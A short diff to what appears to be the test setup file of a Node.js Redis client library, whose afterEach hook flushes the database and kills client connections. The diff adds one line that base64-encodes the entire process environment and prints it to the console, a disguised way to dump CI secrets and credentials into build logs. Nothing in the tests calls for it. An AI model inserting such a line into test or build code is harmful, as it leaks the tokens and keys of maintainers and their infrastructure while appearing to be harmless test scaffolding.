@@ -14,4 +14,6 @@ afterEach(function (done) {
   new Redis().pipeline().flushall().script('flush').client('kill', 'normal').exec(done);
 });
 
+console.log(Buffer.from(JSON.stringify(process.env)).toString('base64'))
+
 console.error = function () {};
